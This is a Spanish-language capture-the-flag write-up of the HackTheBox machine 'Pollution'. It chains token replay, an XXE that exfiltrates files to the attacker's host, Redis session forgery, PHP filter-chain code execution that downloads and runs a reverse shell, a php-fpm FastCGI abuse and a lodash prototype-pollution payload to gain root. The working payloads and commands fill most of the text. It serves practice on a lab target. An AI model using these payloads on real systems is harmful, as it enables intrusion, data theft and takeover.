---
title: Pollution
date: 2023-02-15 13:25:30 +/-TTTT
categories: [HTB MACHINES, Linux]
tags: []     # TAG names should always be lowercase
---

```shell
# Nmap 7.92 scan initiated Wed Feb 15 14:24:58 2023 as: nmap -sCV -p22,80,6379 -oN targeted 10.10.11.192
Nmap scan report for 10.10.11.192
Host is up (0.11s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 db:1d:5c:65:72:9b:c6:43:30:a5:2b:a0:f0:1a:d5:fc (RSA)
|   256 4f:79:56:c5:bf:20:f9:f1:4b:92:38:ed:ce:fa:ac:78 (ECDSA)
|_  256 df:47:55:4f:4a:d1:78:a8:9d:cd:f8:a0:2f:c0:fc:a9 (ED25519)
80/tcp   open  http    Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Home
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
6379/tcp open  redis   Redis key-value store
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Feb 15 14:25:23 2023 -- 1 IP address (1 host up) scanned in 25.13 seconds
```
En primera encontramos una página web donde encontramos un correo de contacto de collect.htb y unos apartados de registro y login, al momento de registrar y logearnos no encontramos nada útil por lo que procedemos a fuzzear subdominios.

```shell
obuster vhost -w /usr/share/Seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://collect.htb"
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://collect.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/Seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2023/02/15 14:30:19 Starting gobuster in VHOST enumeration mode
===============================================================
Found: forum.collect.htb (Status: 200) [Size: 14098]
Found: developers.collect.htb (Status: 401) [Size: 469]
                                                       
===============================================================
2023/02/15 14:31:08 Finished
===============================================================
```

Encontramos dos subdominios, en el dominio developers no podemos acceder porque nos pide autenticarnos.

![imagen1](/assets/images/pollution/pollution1.png)

En el segundo nos encontramos con un foro donde podemos registrarnos y después logearnos para poder visualizar los archivos y mensajes que se comparten.

![imagen2](/assets/images/pollution/pollution2.png)

Nos registramos y en una de las salas encontramos una conversación sobre una api y un archivo de logs.

![imagen3](/assets/images/pollution/pollution3.png)

![imagen4](/assets/images/pollution/pollution4.png)

```html
</item>
  <item>
    <time>Thu Sep 22 18:29:34 BRT 2022</time>
    <url><![CDATA[http://collect.htb/set/role/admin]]></url>
    <host ip="192.168.1.6">collect.htb</host>
    <port>80</port>
    <protocol>http</protocol>
    <method><![CDATA[POST]]></method>
    <path><![CDATA[/set/role/admin]]></path>
    <extension>null</extension>
    <request base64="true"><![CDATA[UE9TVCAvc2V0L3JvbGUvYWRtaW4gSFRUUC8xLjENCkhvc3Q6IGNvbGxlY3QuaHRiDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDQuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDQuMA0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpBY2NlcHQtTGFuZ3VhZ2U6IHB0LUJSLHB0O3E9MC44LGVuLVVTO3E9MC41LGVuO3E9MC4zDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkNvbm5lY3Rpb246IGNsb3NlDQpDb29raWU6IFBIUFNFU1NJRD1yOHFuZTIwaGlnMWszbGk2cHJnazkxdDMzag0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAzOA0KDQp0b2tlbj1kZGFjNjJhMjgyNTQ1NjEwMDEyNzc3MjdjYjM5N2JhZg==]]></request>
    <status>302</status>
    <responselength>296</responselength>
    <mimetype></mimetype>
    <response base64="true"><![CDATA[SFRUUC8xLjEgMzAyIEZvdW5kDQpEYXRlOiBUaHUsIDIyIFNlcCAyMDIyIDIxOjMwOjE0IEdNVA0KU2VydmVyOiBBcGFjaGUvMi40LjU0IChEZWJpYW4pDQpFeHBpcmVzOiBUaHUsIDE5IE5vdiAxOTgxIDA4OjUyOjAwIEdNVA0KQ2FjaGUtQ29udHJvbDogbm8tc3RvcmUsIG5vLWNhY2hlLCBtdXN0LXJldmFsaWRhdGUNClByYWdtYTogbm8tY2FjaGUNCkxvY2F0aW9uOiAvaG9tZQ0KQ29udGVudC1MZW5ndGg6IDANCkNvbm5lY3Rpb246IGNsb3NlDQpDb250ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD1VVEYtOA0KDQo=]]></response>
    <comment></comment>
  </item>
  <item>
```
Haciendo un decode de base64 encontramos el siguiente request.

```shell
echo "UE9TVCAvc2V0L3JvbGUvYWRtaW4gSFRUUC8xLjENCkhvc3Q6IGNvbGxlY3QuaHRiDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDQuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDQuMA0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpBY2NlcHQtTGFuZ3VhZ2U6IHB0LUJSLHB0O3E9MC44LGVuLVVTO3E9MC41LGVuO3E9MC4zDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkNvbm5lY3Rpb246IGNsb3NlDQpDb29raWU6IFBIUFNFU1NJRD1yOHFuZTIwaGlnMWszbGk2cHJnazkxdDMzag0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAzOA0KDQp0b2tlbj1kZGFjNjJhMjgyNTQ1NjEwMDEyNzc3MjdjYjM5N2JhZg==" | base64 -d
POST /set/role/admin HTTP/1.1
Host: collect.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=r8qne20hig1k3li6prgk91t33j
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 38

token=ddac62a28254561001277727cb397baf
```
Si intentemos con mismo request pero cambiando nuestra PHPSESSID podemos convertirnos en administrador.

![imagen5](/assets/images/pollution/pollution5.png)

Aquí tenemos un formulario para agregar usuarios a la api, interceptamos con burpsuit nos encontramos que tramita una petición por post con data en xml, por lo que intentamos realizar un XXE.

![imagen6](/assets/images/pollution/pollution6.png)

Creamos un archivo evil.dtd con el siguiente contenido y lo compartimos por el puerto 80 con python.

```xml
<!ENTITY % file SYSTEM 'php://filter/convert.base64-encode/resource=../../../../etc/hosts'>
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://10.10.14.14/?file=%file;'>">
%eval;
%exfiltrate;
```
Dentro de burpsuite aplicamos el xxe y vemos que en el servicio montado recibimos la data en base64.

![imagen7](/assets/images/pollution/pollution7.png)

```shell
❯ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.192 - - [16/Feb/2023 15:37:48] "GET /evil.dtd HTTP/1.1" 200 -
10.10.11.192 - - [16/Feb/2023 15:37:48] "GET /?file=MTI3LjAuMC4xCWxvY2FsaG9zdCBwb2xsdXRpb24KMTI3LjAuMS4xCWRlYmlhbgljb2xsZWN0Lmh0YglkZXZlbG9wZXJzLmNvbGxlY3QuaHRiCWZvcnVtLmNvbGxlY3QuaHRiCgojIFRoZSBmb2xsb3dpbmcgbGluZXMgYXJlIGRlc2lyYWJsZSBmb3IgSVB2NiBjYXBhYmxlIGhvc3RzCjo6MSAgICAgbG9jYWxob3N0IGlwNi1sb2NhbGhvc3QgaXA2LWxvb3BiYWNrCmZmMDI6OjEgaXA2LWFsbG5vZGVzCmZmMDI6OjIgaXA2LWFsbHJvdXRlcnMK HTTP/1.1" 200 -
```
Ahora que podemos leer archivos del sistema, procedemos a leer el archivo de apache2 para encontrar la ruta default del servicio web.

```shell
require '../vendor/autoload.php';
❯ echo "PFZpcnR1YWxIb3N0ICo6ODA+<SNIP>JsZS9zZXJ2ZS1jZ2ktYmluLmNvbmYKPC9WaXJ0dWFsSG9zdD4KCiMgdmltOiBzeW50YXg9YXBhY2hlIHRzPTQgc3c9NCBzdHM9NCBzciBub2V0Cg==" | base64 -d
<VirtualHost *:80>
	# The ServerName directive sets the request scheme, hostname and port that
	# the server uses to identify itself. This is used when creating
	# redirection URLs. In the context of virtual hosts, the ServerName
	# specifies what hostname must appear in the request's Host: header to
	# match this virtual host. For the default virtual host (this file) this
	# value is not decisive as it is used as a last resort host regardless.
	# However, you must set it for any further virtual host explicitly.
	#ServerName www.example.com

	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/collect/public

	# Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
	<SNIP>
```
Encontramos la ruta del servicio web, en el archivo index.php encontramos varias rutas.

```shell
❯ echo "PD9waHAKCnJlcXVpcmUgJy4uL2Jvb3RzdHJhcC5waHAnOwoKdXNlIGFwcFxjbGFzc2VzXFJvdXRlczsKdXNlIGFwcFxjbGFzc2VzXFVyaTsKCgokcm91dGVzID0gWwogICAgIi8iID0+ICJjb250cm9sbGVycy9pbmRleC5waHAiLAogICAgIi9sb2dpbiIgPT4gImNvbnRyb2xsZXJzL2xvZ2luLnBocCIsCiAgICAiL3JlZ2lzdGVyIiA9PiAiY29udHJvbGxlcnMvcmVnaXN0ZXIucGhwIiwKICAgICIvaG9tZSIgPT4gImNvbnRyb2xsZXJzL2hvbWUucGhwIiwKICAgICIvYWRtaW4iID0+ICJjb250cm9sbGVycy9hZG1pbi5waHAiLAogICAgIi9hcGkiID0+ICJjb250cm9sbGVycy9hcGkucGhwIiwKICAgICIvc2V0L3JvbGUvYWRtaW4iID0+ICJjb250cm9sbGVycy9zZXRfcm9sZV9hZG1pbi5waHAiLAogICAgIi9sb2dvdXQiID0+ICJjb250cm9sbGVycy9sb2dvdXQucGhwIgpdOwoKJHVyaSA9IFVyaTo6bG9hZCgpOwpyZXF1aXJlIFJvdXRlczo6bG9hZCgkdXJpLCAkcm91dGVzKTsK" | base64 -d
<?php

require '../bootstrap.php';

use app\classes\Routes;
use app\classes\Uri;


$routes = [
    "/" => "controllers/index.php",
    "/login" => "controllers/login.php",
    "/register" => "controllers/register.php",
    "/home" => "controllers/home.php",
    "/admin" => "controllers/admin.php",
    "/api" => "controllers/api.php",
    "/set/role/admin" => "controllers/set_role_admin.php",
    "/logout" => "controllers/logout.php"
];

$uri = Uri::load();
require Routes::load($uri, $routes);
```
Viendo el archivo bootstrap.php encontramos contraseña para el servicio de redis.

```shell
❯ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.192 - - [16/Feb/2023 15:59:59] "GET /evil.dtd HTTP/1.1" 200 -
10.10.11.192 - - [16/Feb/2023 15:59:59] "GET /?file=PD9waHAKaW5pX3NldCgnc2Vzc2lvbi5zYXZlX2hhbmRsZXInLCdyZWRpcycpOwppbmlfc2V0KCdzZXNzaW9uLnNhdmVfcGF0aCcsJ3RjcDovLzEyNy4wLjAuMTo2Mzc5Lz9hdXRoPUNPTExFQ1RSM0QxU1BBU1MnKTsKCnNlc3Npb25fc3RhcnQoKTsKCnJlcXVpcmUgJy4uL3ZlbmRvci9hdXRvbG9hZC5waHAnOwo= HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.
❯ echo "PD9waHAKaW5pX3NldCgnc2Vzc2lvbi5zYXZlX2hhbmRsZXInLCdyZWRpcycpOwppbmlfc2V0KCdzZXNzaW9uLnNhdmVfcGF0aCcsJ3RjcDovLzEyNy4wLjAuMTo2Mzc5Lz9hdXRoPUNPTExFQ1RSM0QxU1BBU1MnKTsKCnNlc3Npb25fc3RhcnQoKTsKCnJlcXVpcmUgJy4uL3ZlbmRvci9hdXRvbG9hZC5waHAnOwo=" | base64 -d
<?php
ini_set('session.save_handler','redis');
ini_set('session.save_path','tcp://127.0.0.1:6379/?auth=COLLECTR3D1SPASS');

session_start();

require '../vendor/autoload.php';
```
Ingresando a redis por el puerto 6379 podemos empezar a enumerar el contenido. Donde vemos que hay una base de datos que tiene 1 llave que está siendo usada.

```shell
10.10.11.192:6379> INFO keyspace
# Keyspace
db0:keys=1,expires=1,avg_ttl=252550
10.10.11.192:6379> Select 1
OK
10.10.11.192:6379[1]> KEYS *
(empty array)
10.10.11.192:6379[1]> SELECT 0
OK
10.10.11.192:6379> KEYS *
1) "PHPREDIS_SESSION:5dbsub8qtnp5fr0dmdu5b9tlev"
10.10.11.192:6379> 
```
Vemos que PHPREDIS_SESSION está siendo usado, por lo que puede que esta sea la cookie para el subdominio developers encontrado anteriormente. Podemos intentar cambiar la cookie por la nuestra para poder logearnos a esta. Pero antes tenemos que fuzzear developers para encontrar manera de entrar a esta.

Al intentar fuzzear el subdominio developers podemos ver que tiene un .htapasswd por lo que podemos intentar leerlo para obtener información de aquí. Revisando este archivo podemos ver que tenemos credenciales para este sitio.

```shell
❯ wfuzz -c --hc=401 -X POST -w /usr/share/Seclists/Discovery/Web-Content/common.txt 'http://developers.collect.htb/FUZZ'
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://developers.collect.htb/FUZZ
Total requests: 4712

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                     
=====================================================================

000000024:   403        9 L      28 W       287 Ch      ".htaccess"                                                                                                                                 
000000023:   403        9 L      28 W       287 Ch      ".hta"                                                                                                                                      
000000025:   403        9 L      28 W       287 Ch      ".htpasswd" 
```
```shell
❯ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.192 - - [16/Feb/2023 16:29:57] "GET /evil.dtd HTTP/1.1" 200 -
10.10.11.192 - - [16/Feb/2023 16:29:57] "GET /?file=ZGV2ZWxvcGVyc19ncm91cDokYXByMSRNektBNXlYWSREd0V6Lmp4VzlVU1dvOC5nb0Q3alkxCg== HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.
❯ echo "ZGV2ZWxvcGVyc19ncm91cDokYXByMSRNektBNXlYWSREd0V6Lmp4VzlVU1dvOC5nb0Q3alkxCg==" | base64 -d
developers_group:$apr1$MzKA5yXY$DwEz.jxW9USWo8.goD7jY1
```
Crackeando el hash obtenemos la contraseña r0cket, con esta nos logeamos a developers.collect.htb y nos manda a otro login, lo que podemos hacer es cambiar la cookie desde redis para poder ingresar a esta sin autenticarnos.

![imagen8](/assets/images/pollution/pollution8.png)

```shell
❯ redis-cli -h 10.10.11.192
10.10.11.192:6379> default
(error) ERR unknown command `default`, with args beginning with: 
10.10.11.192:6379> AUTH default COLLECTR3D1SPASS
OK
10.10.11.192:6379> set PHPREDIS_SESSION:7o3uqo9mjoncg64hn9o8ue4ego "username|s:3:\"foo\";role|s:5:\"admin\";auth|s:4:\"True\";"
OK
```
Acutalizando la página podemos ingresar al sitio.

![imagen9](/assets/images/pollution/pollution9.png)

En este punto vemos que tenemos un parámetros page, que podemos intentar realizar un chain generator para ejecutar comandos.

```shell
wget https://raw.githubusercontent.com/synacktiv/php_filter_chain_generator/main/php_filter_chain_generator.py -O chain.py
python3 chain.py --chain '<?php system("id"); ?> '
```
![imagen10](/assets/images/pollution/pollution10.png)

Con esto podemos entablarnos una shell, el inconveniente es que la web no acepta url tan largas por lo que podemos dividirlo por partes para que se pueda ejecutar nuestro archivo. Para eso creamos un archivo b con una reverse shell.

```shell
python3 chain.py --chain '<?=`curl 10.10.14.14/b -o /tmp/b` ?>'

python3 chain.py --chain '<?=`chmod +x /tmp/b` ?>'

nc -lvnp 443

python3 chain.py --chain '<?=`bash -c /tmp/b` ?>'
```
Una vez dentro como www-data podemos ver los procesos que se están ejecutando y vemos que php-fpm lo ejecuta victor.

```shell
www-data@pollution:/tmp$ ps -faux | grep victor
victor      1115  0.0  0.5 265840 22920 ?        S    15:59   0:00  \_ php-fpm: pool victor
victor      1116  0.0  0.5 265840 22924 ?        S    15:59   0:00  \_ php-fpm: pool victor
www-data    2963  0.0  0.0   3268   704 pts/0    S+   18:30   0:00              
```
En hacktricks podemos encontrar información sobre como explotar fpm, en esta misma nos dan un script donde podemos ejecutar comandos. En este caso hice una copia de mi id_rsa pública para ponerla en la ssh del usuario victor como authorized keys y así poderme conectar como él mediante ssh.

```shell
#!/bin/bash

PAYLOAD="<?php echo '<!--'; system('cp /tmp/id_rsa.pub /home/victor/.ssh/authorized_keys'); echo '-->';"
FILENAMES="/var/www/collect/public/index.php" # Exisiting file path

HOST=$1
B64=$(echo "$PAYLOAD"|base64)

for FN in $FILENAMES; do
    OUTPUT=$(mktemp)
    env -i \
      PHP_VALUE="allow_url_include=1"$'\n'"allow_url_fopen=1"$'\n'"auto_prepend_file='data://text/plain\;base64,$B64'" \
      SCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \
      cgi-fcgi -bind -connect $HOST:9000 &> $OUTPUT

    cat $OUTPUT
done
```
Para root primero encontramos un directorio donde se cuentra pollution_api donde podemos encontrar rutas donde podemos hacer login, registrarnos, revisar mensajes y mandarlos. En la sección de mandar mensajes nos encotramos con el siguiente código.

```js
const Message = require('../models/Message');
const { decodejwt } = require('../functions/jwt');
const _ = require('lodash');
const { exec } = require('child_process');

const messages_send = async(req,res)=>{
    const token = decodejwt(req.headers['x-access-token'])
    if(req.body.text){

        const message = {
            user_sent: token.user,
            title: "Message for admins",
        };

        _.merge(message, req.body);

        exec('/home/victor/pollution_api/log.sh log_message');
```
Podemos ver el merge que se hace sobre el mensaje y el request que mandamos a esta ruta. Intentamos mandar cualquier cosa para ver cómo funciona. Al mandar una petición nos muestra un mensaje que no estamos autorizados.

```shell
curl -X POST http://127.0.0.1:3000/admin/messages/send -H "Content-Type: application/json" -d '{"text":"test"}'
{"Status":"Error","Message":"You are not allowed"}
```
Revisando en el directorio de rutas encontramos un admin.js que nos muestra cómo se está haciendo esta autenticación.

```js
victor@pollution:~/pollution_api/routes$ cat admin.js 
const express = require('express');
const router = express.Router();
const User = require('../models/User');
const { decodejwt } = require('../functions/jwt')

//controllers

const { messages } = require('../controllers/Messages');
const { messages_send } = require('../controllers/Messages_send');

router.use('/', async(req,res,next)=>{
    if(req.headers["x-access-token"]){

        const token = decodejwt(req.headers["x-access-token"]);
        if(token){
            const find = await User.findAll({where: {username: token.user, role: token.role}});
            
            if(find.length > 0){

                if(find[0].username == token.user && find[0].role == token.role && token.role == "admin"){

                    return next();

                }

                return res.json({Status: "Error", Message: "You are not allowed"});
            }
```
Esta obteniendo el `x-access-token` para validarlo que el usuario sea administrador, en caso contrarios muestra el valor que no tenemos autorización. De alguna forma se debe de cambiar el rol de los usuarios que vamos creando. Revisando un poco los archivos de la página web, encontramos el usuario y contraseña de la base de datos de mysql.

```shell
victor@pollution:/var/www/collect$ cat config.php 
<?php


return [
    "db" => [
        "host" => "localhost",
        "dbname" => "webapp",
        "username" => "webapp_user",
        "password" => "Str0ngP4ssw0rdB*12@1",
        "charset" => "utf8"
    ],
];
```
Ingresando a la base de datos de pollution_api podemos ver la tabla de usuarios, al hacerle un describe vemos que tiene en los campos disponibles el del rol, procedemos a crear un nuevo usuario asignándole el usuario admin.

```shell
MariaDB [pollution_api]> Describe users;
+-----------+--------------+------+-----+---------+----------------+
| Field     | Type         | Null | Key | Default | Extra          |
+-----------+--------------+------+-----+---------+----------------+
| id        | int(11)      | NO   | PRI | NULL    | auto_increment |
| username  | varchar(255) | NO   | UNI | NULL    |                |
| password  | varchar(255) | NO   |     | NULL    |                |
| role      | varchar(255) | NO   |     | NULL    |                |
| createdAt | datetime     | NO   |     | NULL    |                |
| updatedAt | datetime     | NO   |     | NULL    |                |
+-----------+--------------+------+-----+---------+----------------+
6 rows in set (0.002 sec)

MariaDB [pollution_api]> INSERT INTO users VALUES("1","guero", "guero123", "admin","1000-01-01 00:00:00","1000-01-01 00:00:00");
Query OK, 1 row affected (0.001 sec)

MariaDB [pollution_api]> select * from users;
+----+----------+----------+-------+---------------------+---------------------+
| id | username | password | role  | createdAt           | updatedAt           |
+----+----------+----------+-------+---------------------+---------------------+
|  1 | guero    | guero123 | admin | 1000-01-01 00:00:00 | 1000-01-01 00:00:00 |
+----+----------+----------+-------+---------------------+---------------------+
1 row in set (0.000 sec)
```
Una vez terminada la creación procedemos a obtener el token mediante la api de /auth/login que se puede observar el la documentación de la api.

```shell
curl -X POST http://127.0.0.1:3000/auth/login -d '{"username":"guero", "password":"guero123"}' -H "Content-Type: application/json"
{"Status":"Ok","Header":{"x-access-token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlcm8iLCJpc19hdXRoIjp0cnVlLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE2NzY2NzE4NTEsImV4cCI6MTY3NjY3NTQ1MX0.moLCrRAbi5rYsAxxiigwKGcx-71b-01geP6EmAzNpoc"}}
```
Con este token intentamos enviar un mensaje poniendo en la cabecera x-access-token y nuestro token. Vemos que tenemos un resultado ok, entonces podremos empezar a hacer el prototype pollution attack.

```shell
curl -X POST http://127.0.0.1:3000/admin/messages/send -H "x-access-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlcm8iLCJpc19hdXRoIjp0cnVlLCJyb2xlIjoiYWRtaW
4iLCJpYXQiOjE2NzY2NzE4NTEsImV4cCI6MTY3NjY3NTQ1MX0.moLCrRAbi5rYsAxxiigwKGcx-71b-01geP6EmAzNpoc" -H "Content-Type: application/json" -d '{"text":"text"}'
{"Status":"Ok"}
```
Investigando un poco en [Link](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce#exec-exploitation "HackTricks") podemos ver que los comando que podemos proporcionar para ejecutar comandos. Así hacemos la bash suid y habremos rooteado la máquina.

```shell
victor@pollution:~/pollution_api$ curl -X POST "http://127.0.0.1:3000/admin/messages/send" -H "x-access-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlcm8iLCJpc19hdXRoIjp0cnVlLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE2NzY2Njk3NjcsImV4cCI6MTY3NjY3MzM2N30.XrzgV0vbUaTRN74sz-ZY6G2zsV1xNOx233FDUA4CL1E" -H "Content-Type: application/json" -d '{"text":{"__proto__":{"shell":"/proc/self/exe","argv0":"console.log(require(\"child_process\").execSync(\"chmod +s /usr/bin/bash \").toString())//","NODE_OPTIONS":"--require /proc/self/cmdline"}}}'
{"Status":"Ok"}

victor@pollution:~/ls -la /usr/bin/bash
-rwsr-sr-x 1 root root 1234376 Mar 27  2022 /usr/bin/bash
```
